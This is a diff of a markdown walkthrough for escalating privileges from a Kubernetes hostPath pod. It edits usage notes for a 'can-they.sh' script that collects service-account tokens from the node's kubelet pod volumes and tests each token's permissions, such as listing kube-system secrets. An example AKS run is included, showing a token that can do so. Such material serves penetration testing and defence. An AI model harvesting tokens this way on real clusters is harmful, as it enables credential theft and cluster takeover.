@@ -161,11 +161,15 @@ You can access any secret mounted within any pod on the node you are on. In a pr
 Look for tokens that have permissions to get secrets in kube-system. 
 
 
-**Copy the `can-they.sh` helper script to the pod, download it from github, or manually created it**
+**Copy the `can-they.sh` helper script to the pod, download it from github, or manually create it**
 ```
 kubectl cp scripts/can-they.sh hostpath-exec-pod:/
 ```
 
+**What does `can-they.sh` do?**
+* Installs curl and kubectl in the pod (if not installed)
+* Grabs all of the tokens from `/host/var/lib/kubelet/pods/*`
+* Loops each token against the `selfsubjectaccessreviews` endpoint: `kubectl --token=$token auth can-i [$user-input]`
 
 **Exec into pod (Don't chroot)** 
 ```
@@ -174,17 +178,17 @@ kubectl exec -it hostpath-exec-pod -- bash
 
 **Run `can-they.sh`**
 ```
-./can-they.sh --list
-./can-they.sh --list -n kube-system
-./can-they.sh --list -n default
-./can-they.sh list secrets -n kube-system
-./can-they.sh create pods -n kube-system
-./can-they.sh create clusterrolebindings
+./can-they.sh
+./can-they.sh -i "--list -n kube-system"
+./can-they.sh -i "--list -n default"
+./can-they.sh -i "list secrets -n kube-system"
+./can-they.sh -i "create pods -n kube-system"
+./can-they.sh -i "create clusterrolebindings"
 ```
 
 **Example Run on AKS showing gatekeeper-admin-token-jmw8z can list secrets in kube-system**
 ```
-root@aks-agentpool-76920337-vmss000000:/# ./can-they.sh list secrets -n kube-system
+root@aks-agentpool-76920337-vmss000000:/# ./can-they.sh -i "list secrets -n kube-system"
 --------------------------------------------------------
 Token Location: /host/var/lib/kubelet/pods/c888d3a8-743e-41dd-8464-91b3e6628174/volumes/kubernetes.io~secret/gatekeeper-admin-token-jmw8z/token
 Command: kubectl auth can-i list secrets -n kube-system
